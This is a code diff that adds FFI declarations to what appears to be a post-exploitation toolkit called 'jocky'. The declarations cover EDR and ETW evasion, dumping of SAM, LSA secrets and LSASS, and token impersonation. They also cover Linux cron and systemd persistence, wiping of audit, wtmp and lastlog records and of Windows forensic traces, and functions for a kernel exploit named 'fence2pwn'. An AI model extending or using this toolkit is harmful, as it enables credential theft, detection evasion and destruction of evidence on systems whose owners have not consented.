@@ -180,3 +180,67 @@ ffi jocky_syscall_unhook(syscall_num: i32) -> i32;
 ffi jocky_syscall_trace(pid: i32) -> i32;
 ffi jocky_ftrace_attach(func_name: string, callback: i8*) -> i32;
 ffi jocky_ftrace_detach(func_name: string) -> i32;
+
+// ---- HTTP and model downloading ----
+ffi jocky_http_get(url: string, out_buf: i8*, max_size: i64) -> i64;
+ffi jocky_http_post(url: string, data: i8*, data_size: i32, headers: string) -> bool;
+ffi jocky_download_file(url: string, dest_path: string) -> bool;
+ffi jocky_compress_data(data: i8*, size: i32) -> i8*;
+ffi jocky_decompress_data(data: i8*, size: i32) -> i8*;
+
+// ---- Advanced Windows EDR evasion ----
+ffi jocky_unhook_kernel32() -> bool;
+ffi jocky_enable_direct_syscalls() -> bool;
+ffi jocky_disable_ob_callbacks() -> bool;
+ffi jocky_disable_minifilter_callbacks() -> bool;
+ffi jocky_disable_wdfilter() -> bool;
+ffi jocky_patch_etw_provider() -> bool;
+ffi jocky_spoof_process_name(new_name: string) -> bool;
+ffi jocky_hide_from_usermode() -> bool;
+
+// ---- Windows Registry Advanced ----
+ffi jocky_registry_enum_keys(hive: i32, path: string) -> [string];
+ffi jocky_registry_enum_values(hive: i32, path: string) -> [string];
+ffi jocky_registry_get_value(hive: i32, path: string, name: string) -> string;
+ffi jocky_registry_dump_sam() -> i32;
+ffi jocky_registry_dump_security() -> i32;
+ffi jocky_registry_dump_lsa_secrets() -> i32;
+ffi jocky_registry_delete_key(hive: i32, path: string) -> bool;
+
+// ---- Windows Forensics & Anti-Forensics ----
+ffi jocky_wipe_jumplist() -> bool;
+ffi jocky_wipe_thumbcache() -> bool;
+ffi jocky_clear_recent_files() -> bool;
+ffi jocky_clear_mft_timestamps() -> bool;
+ffi jocky_wipe_free_space() -> bool;
+ffi jocky_wipe_temp_files(temp_dir: string, var_tmp_dir: string) -> bool;
+ffi jocky_clear_browser_cache(browser: string) -> bool;
+ffi jocky_clear_browser_history(browser: string) -> bool;
+
+// ---- Linux Persistence ----
+ffi jocky_cron_install(binary_path: string, schedule: string) -> bool;
+ffi jocky_systemd_install(service_name: string, exec_path: string) -> bool;
+ffi jocky_cron_remove(job_name: string) -> bool;
+ffi jocky_systemd_remove(service_name: string) -> bool;
+
+// ---- Linux Advanced Forensics ----
+ffi jocky_linux_cleanup_audit() -> i32;
+ffi jocky_linux_cleanup_wtmp() -> i32;
+ffi jocky_linux_cleanup_lastlog() -> i32;
+ffi jocky_thread_get_info(pid: i32) -> i8*;
+ffi jocky_module_info(handle: i8*) -> i8*;
+ffi jocky_fence2pwn_spray() -> bool;
+ffi jocky_fence2pwn_trigger() -> bool;
+ffi jocky_fence2pwn_verify_spray() -> bool;
+
+// ---- Windows Credential Harvesting ----
+ffi jocky_lsass_dump() -> i32;
+ffi jocky_credentials_enumerate() -> [string];
+ffi jocky_token_enumerate() -> [i32];
+ffi jocky_impersonate_user(username: string, domain: string, password: string) -> bool;
+
+// ---- Generic Data Operations ----
+ffi jocky_data_base64_encode(data: i8*, size: i32) -> string;
+ffi jocky_data_base64_decode(encoded: string) -> i8*;
+ffi jocky_data_hex_encode(data: i8*, size: i32) -> string;
+ffi jocky_data_hex_decode(hex: string) -> i8*;
